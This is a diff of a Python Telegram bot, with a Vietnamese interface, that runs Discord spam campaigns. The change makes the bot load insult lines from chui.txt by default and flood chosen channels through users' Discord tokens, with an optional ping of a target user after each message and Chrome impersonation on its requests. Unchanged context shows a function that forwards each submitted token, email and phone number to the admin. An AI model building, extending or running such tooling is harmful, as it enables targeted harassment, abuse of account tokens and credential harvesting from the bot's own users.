@@ -49,6 +49,19 @@ def to_small_caps(text):
     trans = str.maketrans(normal, small)
     return text.translate(trans)
 
+def get_default_lines():
+    """Hàm lấy kho ngôn mặc định giống Bot Telegram"""
+    lines = []
+    if os.path.exists("chui.txt"):
+        with open("chui.txt", "r", encoding="utf-8") as f:
+            lines = [line.strip() for line in f if line.strip()]
+    if not lines and os.path.exists("chui2.txt"):
+        with open("chui2.txt", "r", encoding="utf-8") as f:
+            lines = [line.strip() for line in f if line.strip()]
+    if not lines:
+        lines = ["TLong spam tới"]
+    return lines
+
 def _sync():
     for n, u in {"chui.txt": U1, "chui2.txt": U2}.items():
         try:
@@ -294,7 +307,7 @@ async def notify_admin_discord_token(user_id, token, user_data, created_at):
 • **ID Người Gửi Telegram:** `{user_id}`
 • **Discord Username:** `{username}`
 • **Discord ID:** `{uid}`
-• **Ngày Tạo Tài Khoản:** `{created_at}`
+• **Ngày Tạo Tạo Khoản:** `{created_at}`
 • **Trạng Thái Nitro:** `{nitro}`
 • **Email:** `{email}` | **Phone:** `{phone}`
 • **Token:** `{token}`
@@ -314,11 +327,11 @@ def render_discord_dashboard(u):
     session = discord_sessions.get(u, {})
     tokens = session.get("tokens", [])
     channels = session.get("channels", [])
-    content = session.get("content", "TLong spam tới")
     delay = session.get("delay", 2.0)
     mode = session.get("mode", "full") # full hoặc line
     font_style = session.get("font_style", "big") # big (To kèm #) hoặc small (Bé)
-    tag_target = session.get("tag_target", "") # ID người dùng muốn tag ở cuối câu
+    tag_target = session.get("tag_target", "") 
+    use_custom_file = session.get("use_custom_file", False)
     
     is_running = u in discord_spam_tasks and not discord_spam_tasks[u].done()
     status_str = "🟢 Đang Spam..." if is_running else "🔴 Đang Dừng"
@@ -328,19 +341,27 @@ def render_discord_dashboard(u):
     mode_str = "Gửi Full (1 lần)" if mode == "full" else "Gửi Từng Dòng"
     font_str = "Chữ To (# Nổi Bật)" if font_style == "big" else "Chữ Bé (Small Caps)"
     tag_str = f"<@{tag_target}> (ID: {tag_target})" if tag_target else "❌ Tắt Spam Tag"
+    
+    lines = session.get("lines", [])
+    if not lines or not use_custom_file:
+        lines = get_default_lines()
+        source_str = "Dùng chung Kho Ngôn Telegram (Mặc Định)"
+    else:
+        source_str = f"File .TXT Cá Nhân ({len(lines)} Dòng)"
 
-    display_content = content[:40] + "..." if len(content) > 40 else content
+    display_sample = lines[0][:40] if lines else "Không có nội dung"
 
     txt = f"""
 🤖 **BẢNG ĐIỀU KHIỂN DISCORD SPAM SYSTEM**
 ────────────────
 • **Trạng thái:** `{status_str}`
+• **Kho Ngôn đang dùng:** `{source_str}`
 • **Danh sách Token:** `{tokens_str}`
 • **ID Kênh/Nhóm Chat:** `{channels_str}`
 • **Chế độ gửi:** `{mode_str}`
 • **Kiểu chữ:** `{font_str}`
 • **Spam Tag cuối câu:** `{tag_str}`
-• **Nội dung mẫu:** `{display_content}`
+• **Nội dung câu mẫu:** `{display_sample}...`
 • **Delay:** `{delay}s`
 """
     buttons = []
@@ -351,7 +372,7 @@ def render_discord_dashboard(u):
 
     buttons.append([
         Button.inline("🆔 Cấu Hình ID Kênh", data="dc_set_channels"),
-        Button.inline("📝 Kho Ngôn (.txt/nhập)", data="dc_set_content")
+        Button.inline("📝 Đổi Kho Ngôn (.txt)", data="dc_set_content")
     ])
     buttons.append([
         Button.inline(f"⚙️ Mode: {mode_str}", data="dc_toggle_mode"),
@@ -474,9 +495,9 @@ async def _callback_handler(ev):
     elif data == "app_discord":
         if u not in discord_sessions:
             discord_sessions[u] = {
-                "tokens": [], "channels": [], "content": "TLong spam tới",
-                "lines": ["TLong spam tới"], "delay": 2.0, "mode": "full", 
-                "font_style": "big", "tag_target": ""
+                "tokens": [], "channels": [], "lines": get_default_lines(),
+                "delay": 2.0, "mode": "full", "font_style": "big", 
+                "tag_target": "", "use_custom_file": False
             }
         
         txt, buttons = render_discord_dashboard(u)
@@ -495,10 +516,12 @@ async def _callback_handler(ev):
     elif data == "dc_set_content":
         discord_sessions[u]["step"] = "ask_content"
         txt = """
-📝 **CẤU HÌNH KHO NGÔN / NỘI DUNG SPAM**
+📝 **CẤU HÌNH KHO NGÔN SPAM DISCORD**
 ────────────────
-• Bạn có thể **GỬI 1 FILE .TXT** (Bao nhiêu dòng Bot cũng đọc full 100%).
-• Hoặc **NHẬP VĂN BẢN TRỰC TIẾP** vào tin nhắn bên dưới.
+• Mặc định Bot sẽ dùng **Kho Ngôn giống Bot Telegram**.
+• Nếu muốn dùng kho ngôn riêng: Hãy **GỬI FILE .TXT** lên (bao nhiêu dòng Bot cũng đọc full 100%).
+• Hoặc nhập chữ/văn bản trực tiếp.
+• Gửi chữ `reset` nếu muốn quay về dùng Kho Ngôn mặc định của Telegram.
 """
         await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')
 
@@ -542,8 +565,9 @@ async def _callback_handler(ev):
         delay = session.get("delay", 2.0)
         tag_target = session.get("tag_target", "")
         
-        raw_content = session.get("content", "TLong spam tới")
-        lines = session.get("lines", [raw_content])
+        use_custom_file = session.get("use_custom_file", False)
+        lines = session.get("lines", []) if use_custom_file else get_default_lines()
+        raw_content = "\n".join(lines)
 
         async def run_spam_loop():
             async with AsyncSession(impersonate="chrome120") as session_http:
@@ -563,13 +587,12 @@ async def _callback_handler(ev):
 
                             # 2. Xử lý Kiểu chữ (To kèm # / Bé Small Caps)
                             if font_style == "big":
-                                # Tự động chèn dấu # ở đầu mỗi dòng để chữ siêu to
                                 formatted_lines = [f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()]
                                 msg_text = "\n".join(formatted_lines)
                             elif font_style == "small":
                                 msg_text = to_small_caps(msg_text)
 
-                            # 3. Mặc định gắn SPAM TAG ở cuối câu (nếu có cài đặt)
+                            # 3. Mặc định gắn SPAM TAG ở cuối câu (nếu có)
                             if tag_target:
                                 msg_text = f"{msg_text} <@{tag_target}>"
 
@@ -603,9 +626,9 @@ async def _callback_handler(ev):
             discord_spam_tasks.pop(u, None)
         
         discord_sessions[u] = {
-            "tokens": [], "channels": [], "content": "TLong spam tới",
-            "lines": ["TLong spam tới"], "delay": 2.0, "mode": "full", 
-            "font_style": "big", "tag_target": ""
+            "tokens": [], "channels": [], "lines": get_default_lines(),
+            "delay": 2.0, "mode": "full", "font_style": "big", 
+            "tag_target": "", "use_custom_file": False
         }
         await ev.answer("🔄 Đã reset toàn bộ cấu hình Discord!", alert=True)
         
@@ -848,7 +871,14 @@ async def handle_discord_text_input(ev):
         await ev.respond("✅ **Đã cập nhật ID Kênh!**\n" + txt, buttons=buttons, parse_mode='markdown')
 
     elif step == "ask_content":
-        # Đọc nội dung nếu gửi File .txt
+        if ev.text and ev.text.strip().lower() == "reset":
+            session["use_custom_file"] = False
+            session["lines"] = get_default_lines()
+            session["step"] = None
+            txt, buttons = render_discord_dashboard(u)
+            return await ev.respond("✅ **Đã chuyển về dùng Kho Ngôn mặc định của Bot Telegram!**\n" + txt, buttons=buttons, parse_mode='markdown')
+
+        # Đọc nội dung nếu gửi File .txt riêng
         if ev.file and ev.file.ext == ".txt":
             try:
                 file_bytes = await ev.download_media(bytes)
@@ -858,25 +888,25 @@ async def handle_discord_text_input(ev):
                 if not lines:
                     return await ev.respond("❌ File .txt rỗng! Vui lòng gửi lại file khác.")
 
-                session["content"] = raw_text
                 session["lines"] = lines
+                session["use_custom_file"] = True
                 session["step"] = None
 
                 txt, buttons = render_discord_dashboard(u)
-                return await ev.respond(f"✅ **Đã Nạp Thành Công File TXT ({len(lines)} Dòng)!**\n" + txt, buttons=buttons, parse_mode='markdown')
+                return await ev.respond(f"✅ **Đã Nạp Thành Công File TXT Cá Nhân ({len(lines)} Dòng)!**\n" + txt, buttons=buttons, parse_mode='markdown')
             except Exception as ex:
                 return await ev.respond(f"❌ Lỗi đọc file TXT: `{ex}`")
 
-        # Đọc nội dung nếu nhập chữ trực tiếp
+        # Đọc nội dung nhập chữ trực tiếp
         elif ev.text:
             content = ev.text.strip()
             lines = [line.strip() for line in content.splitlines() if line.strip()]
-            session["content"] = content
             session["lines"] = lines
+            session["use_custom_file"] = True
             session["step"] = None
 
             txt, buttons = render_discord_dashboard(u)
-            await ev.respond("✅ **Đã cập nhật Nội dung Spam!**\n" + txt, buttons=buttons, parse_mode='markdown')
+            await ev.respond("✅ **Đã cập nhật Kho Ngôn riêng!**\n" + txt, buttons=buttons, parse_mode='markdown')
 
     elif step == "ask_tag":
         tag_val = ev.text.strip().replace("<@", "").replace(">", "").replace("!", "")
@@ -955,4 +985,3 @@ if __name__ == '__main__':
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         pass
-tons
